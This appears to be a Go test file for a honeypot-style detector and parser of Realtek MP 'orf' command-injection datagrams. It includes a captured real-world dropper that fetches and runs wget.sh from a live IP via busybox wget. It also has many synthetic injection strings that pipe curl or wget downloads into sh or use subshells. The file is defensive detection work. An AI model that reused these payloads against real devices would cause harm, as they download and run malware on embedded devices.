package realtek

import (
	"testing"

	"github.com/stretchr/testify/require"
)

// capturedOrf is the datagram of Ochi event
// dd956ba6-16d5-44f8-becf-760ad929f3df (udp/9034 from 84.33.103.153).
const capturedOrf = "orf;cd /tmp;rm wget.sh;/bin/busybox wget http://202.110.70.60:800/wget.sh;sh wget.sh realtek; #"

func TestLooksLikeRealtekMP(t *testing.T) {
	for _, in := range []string{
		capturedOrf,
		"orf",
		"orf\n",
		"orf\r\n",
		"orf|id",
		"orf&&id",
		"orf`id`",
		"orf$(id)",
		"orf\x00",
	} {
		require.True(t, LooksLikeRealtekMP([]byte(in)), "%q", in)
	}
	for _, in := range []string{
		"",
		"or",
		"orfx;id",
		"orf$id",
		"ORF;id",
		" orf;id",
		"GET / HTTP/1.1\r\n",
		"\x00\x01orf;",
	} {
		require.False(t, LooksLikeRealtekMP([]byte(in)), "%q", in)
	}
}

func TestParseCaptured(t *testing.T) {
	req := Parse([]byte(capturedOrf))
	require.Equal(t, "cd /tmp;rm wget.sh;/bin/busybox wget http://202.110.70.60:800/wget.sh;sh wget.sh realtek", req.Shell)
	require.Equal(t, []string{"http://202.110.70.60:800/wget.sh"}, req.URLs)
}

func TestParse(t *testing.T) {
	cases := []struct {
		name  string
		in    string
		shell string
		urls  []string
	}{
		{"bare", "orf", "", nil},
		{"pipe", "orf|wget http://a.test/x -O- | sh", "wget http://a.test/x -O- | sh", []string{"http://a.test/x"}},
		{"and", "orf&&curl -s https://a.test/y|sh", "curl -s https://a.test/y|sh", []string{"https://a.test/y"}},
		{"subshell", "orf$(wget http://a.test/z)", "$(wget http://a.test/z)", []string{"http://a.test/z"}},
		{"backtick", "orf`curl http://a.test/b`", "`curl http://a.test/b`", []string{"http://a.test/b"}},
		{"quoted", `orf;wget "http://a.test/q";sh q`, `wget "http://a.test/q";sh q`, []string{"http://a.test/q"}},
		{
			"multiple and duplicate",
			"orf;wget http://a.test/m1;curl -O http://b.test/m2;wget http://a.test/m1;tftp tftp://c.test/m3; #",
			"wget http://a.test/m1;curl -O http://b.test/m2;wget http://a.test/m1;tftp tftp://c.test/m3",
			[]string{"http://a.test/m1", "http://b.test/m2", "tftp://c.test/m3"},
		},
		{"url without downloader", "orf;echo http://a.test/n", "echo http://a.test/n", nil},
		{"comment with text", "orf;id # pwned", "id", nil},
		{"fragment kept", "orf;wget http://a.test/f#x", "wget http://a.test/f#x", []string{"http://a.test/f#x"}},
		{"trailing nul and newline", "orf;id\x00\r\n", "id", nil},
		{"truncated url", "orf;cd /tmp;wget http://202.110.7", "cd /tmp;wget http://202.110.7", []string{"http://202.110.7"}},
		{"truncated scheme", "orf;wget http://", "wget http://", nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := Parse([]byte(tc.in))
			require.Equal(t, tc.shell, req.Shell)
			require.Equal(t, tc.urls, req.URLs)
		})
	}
}

func TestParseCapsURLs(t *testing.T) {
	in := "orf"
	for i := 0; i < maxURLs+5; i++ {
		in += ";wget http://a.test/" + string(rune('a'+i))
	}
	require.Len(t, Parse([]byte(in)).URLs, maxURLs)
}
